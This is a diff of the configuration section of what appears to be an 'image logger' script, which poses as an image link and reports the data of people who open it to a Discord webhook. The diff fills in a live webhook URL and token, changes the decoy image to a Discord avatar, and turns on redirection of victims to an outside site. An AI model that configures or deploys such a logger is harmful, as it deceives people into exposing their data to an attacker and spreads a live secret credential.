@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1413862193476407429/3Bx2k_bijzT2Pr7izJpbS_9LZQ4CScY_6WAkiJtTQElNxRGIAXtahqOhyIceJ9sKd5Rn",
-    "image": "https://static.wikia.nocookie.net/roblox-blox-piece/images/f/f9/Mirage_Clear_View.png/", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/avatars/1113852804172349563/c30e908aa96ae0dda0b2b76410808eb1.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.itsnothacker.run.place/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
